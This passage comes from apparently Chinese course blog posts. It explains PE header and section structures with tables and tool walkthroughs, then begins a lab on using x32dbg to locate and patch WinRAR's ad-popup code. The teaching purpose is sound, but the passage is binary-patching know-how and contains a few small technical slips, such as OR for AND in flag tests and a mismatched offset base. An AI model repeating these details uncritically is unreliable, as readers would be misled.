PE头部也存在类似DOS头部的标记，直接翻译过来就是签名，也是一个常数，即 4字节的字符串”PE\0\0”，如图 3显示了画图程序的签名标记。</p><blockquote><p>​        从以上定义的NT头结构分析可以得出结论，以NT头为基准，文件头(File Header)的偏移量为4，可选头(Optional Header)的偏移量为24，如果分析这两个头部数据信息，可以先找到NT头，然后定位到对应头部开始点，然后再继续分析各自头部的字段，分析起来会更方便。</p></blockquote><p><img src="http://wxjb.jspi.cn/g/query/48bbdbd3-82ca-4101-b3b8-f7dbd8b64e2a" alt="PE头部签名"></p><center>图3 PE头签名</center><p>​        PE头部包括了签名，文件头和选项头。除了签名，另外2个字段又分别是IMAGE_FILE_HEADER和IMAGE_OPTIONAL_HEADER32两个结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_FILE_HEADER</span> &#123;</span><br>    WORD  Machine;  <span class="hljs-comment">//每个CPU都拥有的唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C</span><br>    WORD  NumberOfSections; <span class="hljs-comment">//★指出文件中存在的节区数量</span><br>    DWORD TimeDateStamp;<br>    DWORD PointerToSymbolTable;<br>    DWORD NumberOfSymbols;<br>    WORD  SizeOfOptionalHeader; <span class="hljs-comment">//指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度★</span><br>    WORD  Characteristics; <span class="hljs-comment">//标识文件属性，是否可运行、是否为DLL等，以bit OR形式进行组合</span><br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER</span> &#123;</span><br>    WORD     Magic;  <span class="hljs-comment">//IMAGE_OPTIONAL_HEADER32为0x10B，IMAGE_OPTIONAL_HEADER64为0x20B</span><br>    BYTE     MajorLinkerVersion;<br>    BYTE     MinorLinkerVersion;<br>    DWORD    SizeOfCode;<br>    DWORD    SizeOfInitializedData;<br>    DWORD    SizeOfUninitializedData;<br>    DWORD    AddressOfEntryPoint; <span class="hljs-comment">//★RVA值，指出程序最先执行的代码起始地址</span><br>    DWORD    BaseOfCode;<br>    DWORD    BaseOfData;<br>    DWORD    ImageBase;  <span class="hljs-comment">//★指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF）</span><br>    DWORD    SectionAlignment; <span class="hljs-comment">//★节区在内存中的最小单位</span><br>    DWORD    FileAlignment;    <span class="hljs-comment">//★节区在磁盘文件中的最小单位</span><br>    WORD     MajorOperatingSystemVersion;<br>    WORD     MinorOperatingSystemVersion;<br>    WORD     MajorImageVersion;<br>    WORD     MinorImageVersion;<br>    WORD     MajorSubsystemVersion;<br>    WORD     MinorSubsystemVersion;<br>    DWORD    Win32VersionValue;<br>    DWORD    SizeOfImage;  <span class="hljs-comment">//指定了PE Image在虚拟内存中所占空间的大小</span><br>    DWORD    SizeOfHeaders;<br>    DWORD    CheckSum;<br>    WORD     Subsystem;   <span class="hljs-comment">//区分系统驱动文件和普通可执行文件</span><br>    WORD     DllCharacteristics;<br>    DWORD    SizeOfStackReserve;<br>    DWORD    SizeOfStackCommit;<br>    DWORD    SizeOfHeapReserve;<br>    DWORD    SizeOfHeapCommit;<br>    DWORD    LoaderFlags;<br>    DWORD    NumberOfRvaAndSizes;   <span class="hljs-comment">//指定Data Directory数组的大小</span><br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="hljs-comment">//★数据目录数组</span><br> &#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br><br></code></pre></td></tr></table></figure><blockquote><p>​        以上定义中，IMAGE_FILE_HEADER头部中SizeOfOptionalHeader字段给出了可选头部的长度信息，这将会方便二进制级别的分析中，快速定位节表，因为可选头后面紧跟的就是节表Section Table。SizeOfOptionalHeader位于NT头部20字节偏移位置。<br>​        另外，以上定义中DataDirectory（距离NT头偏移120字节）是可选头中的重要数据，但数组大小由IMAGE_OPTIONAL_HEADER.NumberOfRvaAndSizes确定，因为次字段在DataDirectory前面4字节，所以距离NT头部116字节。<br>​        AddressOfEntryPoint距离NT头40字节。</p></blockquote><p>​        通过以上的结构定义可以了解PE文件头由IMAGE_NT_HEADERS，IMAGE_FILE_HEADER和IMAGE_OPTIONAL_HEADER结构体定义其内部的数据含义。具体含义可以通过查询微软的官方文档获得。</p><p>参考地址为：<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header">https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header</a></p><p>这里对其中关键的几个属性进行说明（请重点关注标注★符号）：</p><p>（1）Machine 计算机架构。<br>        该字段表示PE文件执行的计算机架构环境，0x014c表示x86架构，而0x8664表示x64计算机架构环境。</p><p>（2）NumberOfSections <sup>★</sup>节数<br>        该字段表示在PE头部后面紧跟的“节表”的大小，也就是“节数”，在Windows环境下最大节数为96。</p><p>（3）SizeOfOptionalHeader <sup>★</sup>可选头的大小，单位是字节。</p><p>（4）Characteristics 镜像特性</p><p>​        该字段表示了文件镜像的一些属性特点，使用表格 1中列出了各种不同属性含义及其对应代码，多个属性可以使用“按位或”的方式计算得到最终值。反过来说，可以通过对Characteristics值使用按位或的计算，通过是否结果为零的方式判断是否具有对应属性。</p><p>表格 1 Characteristics含义</p><table><thead><tr><th align="left">标志</th><th align="left">值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">IMAGE_FILE_RELOCS_STRIPPED</td><td align="left">0x0001</td><td align="left">纯映像、Windows CE 和 Microsoft Windows NT 及更高版本。 这表示该文件不包含基填重定位，因此必须加载到其首选基址。 如果基址不可用，则加载程序将报告错误。 链接器的默认行为是从可执行文件 (EXE) 文件中去除基址重定位。</td></tr><tr><td align="left">IMAGE_FILE_EXECUTABLE_IMAGE</td><td align="left">0x0002</td><td align="left">纯映像。 这表示映像文件有效并且可以运行。 如果未设置此标志，则表示有链接器错误。</td></tr><tr><td align="left">IMAGE_FILE_LINE_NUMS_STRIPPED</td><td align="left">0x0004</td><td align="left">COFF 行号已删除。 此标志已被弃用，应为零。</td></tr><tr><td align="left">IMAGE_FILE_LOCAL_SYMS_STRIPPED</td><td align="left">0x0008</td><td align="left">本地符号的 COFF 符号表条目已删除。 此标志已被弃用，应为零。</td></tr><tr><td align="left">IMAGE_FILE_AGGRESSIVE_WS_TRIM</td><td align="left">0x0010</td><td align="left">已过时。 主动剪裁工作集。 已针对 Windows 2000 及更高版本弃用此标志，此标志必须为零。</td></tr><tr><td align="left">IMAGE_FILE_LARGE_ADDRESS_ AWARE</td><td align="left">0x0020</td><td align="left">应用程序可以处理 &gt; 2 GB 地址。</td></tr><tr><td align="left"></td><td align="left">0x0040</td><td align="left">此标志将保留以供将来使用。</td></tr><tr><td align="left">IMAGE_FILE_BYTES_REVERSED_LO</td><td align="left">0x0080</td><td align="left">Little endian：最低有效位 (LSB) 位于内存中最高有效位 (MSB) 之前。 此标志已被弃用，应为零。</td></tr><tr><td align="left">IMAGE_FILE_32BIT_MACHINE</td><td align="left">0x0100</td><td align="left">计算机基于 32 位字体系结构。</td></tr><tr><td align="left">IMAGE_FILE_DEBUG_STRIPPED</td><td align="left">0x0200</td><td align="left">从映像文件中删除了调试信息。</td></tr><tr><td align="left">IMAGE_FILE_REMOVABLE_RUN_ FROM_SWAP</td><td align="left">0x0400</td><td align="left">如果映像位于可移动媒体上，请完全加载该映像并将其复制到交换文件。</td></tr><tr><td align="left">IMAGE_FILE_NET_RUN_FROM_SWAP</td><td align="left">0x0800</td><td align="left">如果映像位于网络媒体上，请完全加载该映像并将其复制到交换文件。</td></tr><tr><td align="left">IMAGE_FILE_SYSTEM</td><td align="left">0x1000</td><td align="left">映像文件是系统文件，而不是用户程序。</td></tr><tr><td align="left">IMAGE_FILE_DLL</td><td align="left">0x2000</td><td align="left">图像文件是动态链接库 (DLL)。 虽然无法直接运行此类文件，但这些文件被视为几乎适用于所有用途的可执行文件。</td></tr><tr><td align="left">IMAGE_FILE_UP_SYSTEM_ONLY</td><td align="left">0x4000</td><td align="left">该文件应仅在单处理器计算机上运行。</td></tr><tr><td align="left">IMAGE_FILE_BYTES_REVERSED_HI</td><td align="left">0x8000</td><td align="left">Big endian：MSB 在内存中的 LSB 之前。 此标志已被弃用，应为零。</td></tr></tbody></table><p>（5）Magic魔术字</p><p>​        该字段表示了文件的状态，可以使用表格 2查询其具体含义。</p><p>表格 2 Magic字段含义</p><table><thead><tr><th><strong>标识符</strong></th><th>值</th><th><strong>含义解释</strong></th></tr></thead><tbody><tr><td>IMAGE_NT_OPTIONAL_HDR_MAGIC</td><td></td><td>可执行文件映像。32位程序值为 0x10b；64位程序值为 0x20b</td></tr><tr><td>IMAGE_NT_OPTIONAL_HDR32_MAGIC</td><td>0x10b</td><td>可执行文件映像。</td></tr><tr><td>IMAGE_NT_OPTIONAL_HDR64_MAGIC</td><td>0x20b</td><td>可执行文件映像。</td></tr><tr><td>IMAGE_ROM_OPTIONAL_HDR_MAGIC</td><td>0x107</td><td>ROM映像。</td></tr></tbody></table><p> （6）AddressOfEntryPoint 入口地址<sup>★★★</sup></p><p>​        相对于PE文件加载进入内存中，代码的起始入口地址，这个地址使用了相对地址，即相对于Image base地址的偏移地址。</p><p>（7）BaseOfCode 代码节入口地址，该地址是代码节的开始位置，使用了相对地址表示。</p><p>（8）ImageBase 镜像基地址<sup>★★</sup></p><p>​        镜像基地址就是以上叙述中提及的Image base地址，即当PE文件加载到内存中，PE文件内存中开始位置的地址。通常在PE头部中的各类地址都是相对这个地址的偏移量，所以这是其他地址的基础，称为基地址。这个地址是64K的整倍数，通常默认Windows可执行文件（EXE）使用0x00400000,动态链接库（DLL）使用0x10000000。</p><p>（9）SectionAlignment（节对齐）和FileAlignment（文件对齐）</p><p>​        前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位。节对齐和文件对齐分别是PE文件中数据在内存和文件中数据存储的分块尺寸规定，无论是PE文件数据加载到内存中还是保存在文件中，都需要按照一定的尺寸划分存储块，默认情况下，加载到内存中的“节”的数据必须按照0x1000大小存放，这实际上就是操作系统默认的内存页面的大小（4K）；而相同的数据如果保存在文件中，那么需要按照FileAlignment大小保存，这个数值通常在512 到64K之间的2的整数次幂，默认值为512，即0x200。</p><p>（10）Subsystem 镜像运行的子系统环境</p><p>​        由于PE文件设计的时候是Windows NT开发的年代，当时考虑到底层对当时主流的操作系统的兼容，因此使用了子系统的方式进一步区别PE运行的环境。可以使用表格 3中查询对应的运行环境。</p><p>表格 3 Subsystem取值表</p><table><thead><tr><th align="left">常量</th><th align="left">值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">IMAGE_SUBSYSTEM_UNKNOWN</td><td align="left">0</td><td align="left">未知子系统</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_NATIVE</td><td align="left">1</td><td align="left">设备驱动程序和本机 Windows 进程</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_WINDOWS_GUI</td><td align="left">2</td><td align="left">Windows 图形用户界面 (GUI) 子系统</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_WINDOWS_CUI</td><td align="left">3</td><td align="left">Windows 字符子系统</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_OS2_CUI</td><td align="left">5</td><td align="left">OS&#x2F;2 字符子系统</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_POSIX_CUI</td><td align="left">7</td><td align="left">Posix 字符子系统</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_NATIVE_WINDOWS</td><td align="left">8</td><td align="left">本机 Win9x 驱动程序</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_WINDOWS_CE_GUI</td><td align="left">9</td><td align="left">Windows CE</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_EFI_APPLICATION</td><td align="left">10</td><td align="left">可扩展固件接口 (EFI) 应用程序</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_EFI_BOOT_ SERVICE_DRIVER</td><td align="left">11</td><td align="left">具有启动服务的 EFI 驱动程序</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_EFI_RUNTIME_ DRIVER</td><td align="left">12</td><td align="left">具有运行时服务的 EFI 驱动程序</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_EFI_ROM</td><td align="left">13</td><td align="left">EFI ROM 映像</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_XBOX</td><td align="left">14</td><td align="left">XBOX</td></tr><tr><td align="left">IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION</td><td align="left">16</td><td align="left">Windows 启动应用程序。</td></tr></tbody></table><p>（11）DataDirectory 数据目录<sup>★</sup></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DATA_DIRECTORY</span> &#123;</span><br>    DWORD   VirtualAddress;<br>    DWORD   Size;<br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br></code></pre></td></tr></table></figure><p>​        PE头部中的一些关键的数据使用了“表格”的方式存放，DataDirectory的值指向了这个表格首地址。表格中数据每一行使用IMAGE_DATA_DIRECTORY结构体定义表格列，包括了一个地址(VirtualAddress)信息和所指向内存的大小(Size)信息。虽然每一行都是IMAGE_DATA_DIRECTORY结构体，但是每一行都预先定义好了PE文件中特殊的数据含义。表格 4列出了每一行的含义，第一行是导出表目录，第二行是导入表目录……。</p><p>关于DataDirectory特别需要注意以下2点</p><p>① DataDirectory中每一行实际上是指向另一个表格的地址，如第0行IMAGE_DIRECTORY_ENTRY_EXPORT是导出表的首地址。</p><p>② DataDirectory使用表格 4指明了各行的数据含义，但是实际上DataDirectory最后一行是用于保留定义的，没有出现在表格 4的定义中，因此实际上DataDirectory的总行数最大值应该是16，实际表格行数会保存在NumberOfRvaAndSizes字段中，而因此DataDirectory所占用空间最大为8×16&#x3D;0x80。</p><p>表格 4数据目录表各行含义</p><table><thead><tr><th>索引</th><th align="left">偏移量 (PE&#x2F;PE32+)</th><th align="left">说明</th></tr></thead><tbody><tr><td>0</td><td align="left">96&#x2F;112</td><td align="left">导出表地址和大小 Export Table</td></tr><tr><td>1</td><td align="left">104&#x2F;120</td><td align="left">导入表地址和大小 Import Table</td></tr><tr><td>2</td><td align="left">112&#x2F;128</td><td align="left">资源表地址和大小 Resource Table</td></tr><tr><td>3</td><td align="left">120&#x2F;136</td><td align="left">异常表地址和大小 Exception Table</td></tr><tr><td>4</td><td align="left">128&#x2F;144</td><td align="left">证书表地址和大小 Certificate Table</td></tr><tr><td>5</td><td align="left">136&#x2F;152</td><td align="left">基重定位表地址和大小 Base Relocation Table</td></tr><tr><td>6</td><td align="left">144&#x2F;160</td><td align="left">调试信息起始地址和大小 Debug Table</td></tr><tr><td>7</td><td align="left">152&#x2F;168</td><td align="left">特定于体系结构的数据地址和大小 Architecture Table</td></tr><tr><td>8</td><td align="left">160&#x2F;176</td><td align="left">全局指针注册相对虚拟地址 Global Pointer Table</td></tr><tr><td>9</td><td align="left">168&#x2F;184</td><td align="left">线程本地存储 (TLS) 表地址和大小 Thread Local Storage Table</td></tr><tr><td>10</td><td align="left">176&#x2F;192</td><td align="left">加载配置表地址和大小 Load Configuration Table</td></tr><tr><td>11</td><td align="left">184&#x2F;200</td><td align="left">绑定导入表地址和大小 Bound Import Table</td></tr><tr><td>12</td><td align="left">192&#x2F;208</td><td align="left">导入地址表地址和大小 Import Address Table, IAT</td></tr><tr><td>13</td><td align="left">200&#x2F;216</td><td align="left">延迟导入描述符地址和大小 Delay Import Table</td></tr><tr><td>14</td><td align="left">208&#x2F;224</td><td align="left">CLR 标头地址和大小</td></tr><tr><td>15</td><td align="left">216&#x2F;232</td><td align="left">预留</td></tr></tbody></table><p>注意：偏移量PE32+是64位版本PE规范，以上偏移都是以NT头为基准。</p><h3 id="3-节区头和节区（Sections）"><a href="#3-节区头和节区（Sections）" class="headerlink" title="3.  节区头和节区（Sections）"></a>3.  节区头和节区（Sections）</h3><p>​        PE文件中的数据是按照节（Section）进行管理存储的，一般有代码节区和数据节区等，节区的名称和个数都是可变的，因此通常需要从节区头中获得以上节的相关信息。</p><p>​        节区头紧跟在PE头后面，因此可以通过计算获得其地址。节区头中定义了各节区的属性，包括不同的特性、访问权限等，结构体为IMAGE_SECTION_HEADER，重要成员有5个，以下使用代码注释标出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_SECTION_HEADER</span> &#123;</span><br>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>            DWORD   PhysicalAddress;<br>            DWORD   VirtualSize;     <span class="hljs-comment">//内存中节区所占大小</span><br>    &#125; Misc;<br>    DWORD   VirtualAddress;          <span class="hljs-comment">//内存中节区起始地址（RVA）</span><br>    DWORD   SizeOfRawData;           <span class="hljs-comment">//磁盘文件中节区所占大小</span><br>    DWORD   PointerToRawData;        <span class="hljs-comment">//磁盘文件中节区的偏移地址</span><br>    DWORD   PointerToRelocations;<br>    DWORD   PointerToLinenumbers;<br>    WORD    NumberOfRelocations;<br>    WORD    NumberOfLinenumbers;<br>    DWORD   Characteristics;         <span class="hljs-comment">//节区属性（bit OR）</span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<br></code></pre></td></tr></table></figure><p>​        节区头从本质上就是一个表格，表格的每一行是一个IMAGE_SECTION_HEADER结构体，表格长度就是PE头中<strong>NumberOfSections</strong>字段中的数值。</p><p>​        在Windows7操作系统画图程序（mspaint.exe）程序，使用HxD打开后，通过前面的分析，可以确定节区头的位置是<em>0xE8</em> +（<strong>0x04+0x14+0xE0</strong>）&#x3D; 0x1E0,等式左边分别是<em>DOS头长度</em>，**PE签名长度，PE文件头长度和PE可选头长度(这3部分实际上是PE头长度)**，因此在文件0x1E0位置开始就是第一个IMAGE_SECTION_HEADER结构体，如图 4。</p><p><img src="http://wxjb.jspi.cn/g/query/1d7a3607-78c6-44c6-bdd9-0405154bb5eb" alt="mspaint节区"></p><center>图 4 节区头的第一条记录</center><p>​        使用以上的方式获取节表的数据不够方便，因此实际工作中，都是使用工具软件读取，典型的可以使用ExeInfo PE，和x64dbg PE view插件等查阅。</p><h3 id="4-使用其他工具高效的查看以上实验步骤中的各类数据"><a href="#4-使用其他工具高效的查看以上实验步骤中的各类数据" class="headerlink" title="4. 使用其他工具高效的查看以上实验步骤中的各类数据"></a>4. 使用其他工具高效的查看以上实验步骤中的各类数据</h3><p>​        通过前面的实验步骤，可以发现虽然直接使用二进制分析工具能从字节底层对PE文件进行分析，但是工作效率不高，如果仅仅需要查询某个字段的数据，可以使用更方便的专用工具。例如Exeinfo PE，PE Viewer，LordPE，PEiD……，这些工具都能快速的分析PE文件。</p><p><img src="http://wxjb.jspi.cn/g/query/4b169243-420e-4a09-8df7-5a4619ea1125" alt="使用Exeinfo PE打开画图程序"></p><center>图5 使用Exeinfo PE打开画图程序</center><p>​        使用Exeinfo PE工具能方便的查看PE头中的各类信息，如图 6可以清晰的查看头部的各项数据。</p><p><img src="http://wxjb.jspi.cn/g/query/d2413a6a-6c35-4ba5-a8bd-70addc5682c8" alt="图 6 Exeinfo PE查看头部信息"></p><center>图 6 Exeinfo PE查看头部信息</center><p>​        也可以方便的查看节表中的信息，如图 7所示。</p><p><img src="http://wxjb.jspi.cn/g/query/d346913a-1dbb-4353-af09-bccc2a5d6351" alt="图 7 查看节表信息"></p><center>图 7 查看节表信息</center><p>​        在实践工作中，x32dbg工具的PE Viewer插件能比较直观的显示PE头部的各类数据，同学们也可以尝试使用。</p><p><img src="http://wxjb.jspi.cn/g/query/498c2c64-5d85-4d73-a7d8-923bf59e8ecd" alt="图 8 使用x32dbg工具查看PE可选头部信息"></p><center>图 8 使用x32dbg工具查看PE可选头部信息</center><p>​        如图 8的界面中，使用x32dbg工具的PE Viewer插件能直观的查看PE文件中的数据字段，其界面左侧的树状导航窗格给出了PE文件的基本数据架构，单击其中数据项，右侧就能以表格的方式显示具体相关的数据，使用起来非常方便。此外x32dbg是x64dbg动态调试工具的32位版本，是今后学习中动态调试PE文件的重要工具。</p><h2 id="五、实验结果"><a href="#五、实验结果" class="headerlink" title="五、实验结果"></a>五、实验结果</h2><ol><li>请使用HxD打开Windows操作系统自带的记事本程序（c:\Windows\SysWOW64\notepad.exe），完成以下的实验内容。</li></ol><p>（1）查找DOS头部e_lfanew字段的值（                ）,并提供截图。</p><p>（2）查找PE头部AddressOfEntryPoint字段值（             ），并提供截图。</p><p>（3）查找PE头部Characteristics，并解析出其含义：（                 ）</p><p>（4）程序加载到内存中有（      ）个节，其中代码节（即.text节）的RAV地址是（          ）</p><ol start="2"><li><p>使用Exeinfo PE和x32dbg工具完成题目1中内容。</p></li><li><p>其他实验中的问题和解决结论思考等。</p></li></ol><h2 id="六、思考题"><a href="#六、思考题" class="headerlink" title="六、思考题"></a>六、思考题</h2><p>​        尝试分析一个Windows下64位可执行程序，如Windows 10操作系统中的notepad.exe文件。请独自查阅资料完成，并给出关键的不同之处。（可以参考微软官方文档，如<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32%EF%BC%89">https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32）</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用动态调试器分析WinRAR软件【x64dbg】</title>
    <link href="/2024/10/24/111/%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%99%A8%E5%88%86%E6%9E%90WinRAR%E8%BD%AF%E4%BB%B6%E3%80%90x64dbg%E3%80%91/"/>
    <url>/2024/10/24/111/%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%99%A8%E5%88%86%E6%9E%90WinRAR%E8%BD%AF%E4%BB%B6%E3%80%90x64dbg%E3%80%91/</url>
    
    <content type="html"><![CDATA[<h2 id="实验：使用动态调试器分析WinRAR软件-广告弹窗代码"><a href="#实验：使用动态调试器分析WinRAR软件-广告弹窗代码" class="headerlink" title="实验：使用动态调试器分析WinRAR软件  广告弹窗代码"></a>实验：使用动态调试器分析WinRAR软件  广告弹窗代码</h2><h3 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h3><ol><li><p>了解常用动态调试器及其基本使用</p></li><li><p>掌握Windows PE程序逆向分析的一般过程</p></li></ol><h3 id="二、实验环境："><a href="#二、实验环境：" class="headerlink" title="二、实验环境："></a>二、实验环境：</h3><p>操作系统：Windows 10</p><p>实验对象：<a href="http://172.17.200.225/gyf/Malware/testexes/wrar540scp.zip">WinRAR 5.40 32位版本</a>  </p><p>调试器工具：<a href="http://172.17.200.225/gyf/Malware/x96dbg.zip">x32dbg</a>，<a href="http://172.17.200.225/gyf/Malware/spy++.zip">Spy++</a></p><h3 id="三、实验内容："><a href="#三、实验内容：" class="headerlink" title="三、实验内容："></a>三、实验内容：</h3><h4 id="1-实验背景"><a href="#1-实验背景" class="headerlink" title="1. 实验背景"></a>1. 实验背景</h4><p>​        WinRAR是Windows操作系统环境中经典的压缩和解压缩工具软件，曾经是Windows平台装机必装的软件，然而近几年的简体中文版中植入了广告弹窗代码，每次打开软件会弹出如图 1所示的广告窗口，特别是当电脑是网络离线状态的时候，这个弹窗由于无法加载广告地址上的内容，会造成电脑的卡顿，WinRAR软件的界面无法显示等问题。<br>​        简体中文版的WinRAR无论是否输入了注册码都无法取消这个弹窗，而其他语言版本中都不存在这个问题，因此屏蔽这段广告代码将能让这款经典的软件焕然一新，更好的为我们服务。</p><p><img src="http://wxjb.jspi.cn/g/query/c702ce57-b9fd-4410-8e1b-893691468e87" alt="WinRAR启动后的广告弹窗"></p><center>图 1 WinRAR启动后的广告弹窗</center><h4 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2. 实验内容"></a>2. 实验内容</h4><p>​        通过前面的恶意代码分析课程的学习，我们知道WinRAR是典型的Windows PE可执行文件。通过使用动态调试工具，对程序进行汇编语言级别的分析，可以查找并分析弹窗广告部分的程序代码。<br>​        实验通过使用动态分析工具，如x64dbg，对广告弹窗代码进行动态调试分析，定位并修改PE文件中引起广告弹窗的代码，就可以实现去除弹窗的干扰，达到在没有源代码的条件下对一款软件进行修改的目标。</p><h3 id="四、实验步骤："><a href="#四、实验步骤：" class="headerlink" title="四、实验步骤："></a>四、实验步骤：</h3><h4 id="1-观察分析目标的程序特征。"><a href="#1-观察分析目标的程序特征。" class="headerlink" title="1.   观察分析目标的程序特征。"></a>1.   观察分析目标的程序特征。</h4><p>​        WinRAR软件广告弹窗行为特征分析,发现其弹出的广告框是一个非模态对话框，这个关键信息可以进行一个大胆的猜测，那就是广告弹窗的窗体是采用了CreateWindowsEx这类窗口新建API函数实现的。</p><blockquote><p><strong>模态窗口</strong>（modal window）是一种当弹出后，用户必须先与该窗口交互，直到关闭后才能返回到父窗口的窗口类型。在模态窗口打开的情况下，用户无法对同一应用程序的其他窗口进行操作。这种窗口通常用于执行必须完成的任务，如保存文件、确认删除等操作。</p><p><strong>非模态窗口</strong>（modeless window），与模态窗口相反，当它弹出后，用户仍然可以自由地与应用程序的其他窗口进行交互。非模态窗口不会阻止用户访问应用程序的其他部分，常用于提供信息和功能，但不需要用户立即作出反应的场景，如工具箱、实时状态更新等。</p></blockquote><p><strong>大家可以先运行一下Winrar实验程序，亲自体验一下这个广告窗口非模态窗口特点。</strong></p><h4 id="2-使用Spy-查看相关特征参数。"><a href="#2-使用Spy-查看相关特征参数。" class="headerlink" title="2.   使用Spy++查看相关特征参数。"></a>2.   使用Spy++查看相关特征参数。</h4><p>​        使用Spy++软件查找窗口功能，查看需要分析的广告弹出窗口如图 2所示。请大家注意窗口的一些属性，特别关注图中“类”和“样式”这两个属性值，后面调试分析会用到。</p><p><img src="http://wxjb.jspi.cn/g/query/5ab8d580-c961-4889-8df2-8473077669ac" alt="广告弹窗相关的参数"></p><center>图 2 广告弹窗相关的参数 </center><blockquote><p>提示：Spy++软件启动后，可以使用Ctrl-F快捷键打开查找窗口。将瞄准器光标拖放到需要分析的Windows窗口上就可以得到所需参数信息。</p></blockquote><h4 id="3-动态调试广告弹窗代码，定位启动代码调用点。"><a href="#3-动态调试广告弹窗代码，定位启动代码调用点。" class="headerlink" title="3.   动态调试广告弹窗代码，定位启动代码调用点。"></a>3.   动态调试广告弹窗代码，定位启动代码调用点。</h4><p>​         判断弹窗使用的API函数名称，然后使用动态调试器的断点功能，设置API断点进行调试分析是本实验基本思路。通常打开窗口使用的是CreateWindow和CreateWindowEx两种API，每个API函数分别有多字节和Unicode编码2个版本，例如CreateWindowEx函数在实际的程序发布编译后，可以分别使用CreateWindowExA和CreateWindowExW两个版本，所以调试时需要注意调试所用版本情况，如图3所示的实验截图显示当前的是Unicode版本。</p><p><img src="http://wxjb.jspi.cn/g/query/ad086130-87ff-4185-907b-8fd7b66185ec" alt="查看主模块API函数"></p><center> 图 3 查看主模块API函数 </center><p>​        实验可以使用x32dbg调试器的<strong>“符号”</strong>窗口功能，查看<strong>WinRAR主模块</strong>(图3界面中单击左侧模块列表中winrar.exe)中调用的API函数清单。本质是查看主模块的导入表，如图 3所示表明主模块中使用了CreateWindowExW函数。结合前面步骤中分析得到的结果，广告窗口是非模态窗口，而CreateWindowExW函数正是能够创建非模态窗口的函数，因此大胆推测广告窗口的构建代码和此函数关系密切。因此可以考虑使用API函数断点调试的方式查找广告窗口启动代码位置。</p><blockquote><p>注意：x64dbg是开源的PE文件动态调试工具，能够动态分析Windows下32位和64位PE程序。这类实验样本是32位程序，所以使用x64dbg套件中对应的x32dbg程序分析。</p></blockquote><h4 id="4-添加API断点调试，查找广告弹窗代码。"><a href="#4-添加API断点调试，查找广告弹窗代码。" class="headerlink" title="4.   